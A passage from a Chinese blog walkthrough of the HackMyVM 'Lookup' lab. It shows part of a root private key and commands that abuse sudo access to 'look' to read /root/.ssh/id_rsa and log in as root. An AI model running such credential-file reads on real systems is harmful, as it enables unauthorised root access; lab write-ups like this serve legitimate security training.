+3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
+<span class="token assign-left variable">DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg</span><span class="token operator">==</span>
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<p>直接拿过来登录就行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">think@lookup:~$ <span class="token function">sudo</span> <span class="token function">look</span> <span class="token string">''</span> /root/.ssh/id_rsa <span class="token operator">></span> aaa
+think@lookup:~$ <span class="token function">chmod</span> <span class="token number">600</span> aaa
+think@lookup:~$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@localhost
+The authenticity of <span class="token function">host</span> <span class="token string">'localhost (127.0.0.1)'</span> can<span class="token string">'t be established.
+ECDSA key fingerprint is SHA256:hCU4CBHGs0axyMgyDsZBy1GHRljqponOxB4rQDOUOzA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/home/think/.ssh/known_hosts).
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 08 Oct 2024 02:18:41 AM UTC
+
+  System load:  0.0               Processes:                206
+  Usage of /:   58.6% of 9.75GB   Users logged in:          1
+  Memory usage: 39%               IPv4 address for enp0s17: 192.168.31.193
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+7 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+New release '</span><span class="token number">22.04</span>.5 LTS<span class="token string">' available.
+Run '</span>do-release-upgrade' to upgrade to it.
+
+
+Last login: Wed Sep <span class="token number">11</span> 09:24:50 <span class="token number">2024</span>
+root@lookup:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+
+
+
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/65c2fc62/" title="HackMyVM-Lookup">https://tao0845.github.io/posts/65c2fc62/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/4b74e7f2/" rel="next" title="2023WMCTF ez_java_again_rev"><span class="post-nav-text">2023WMCTF ez_java_again_rev</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
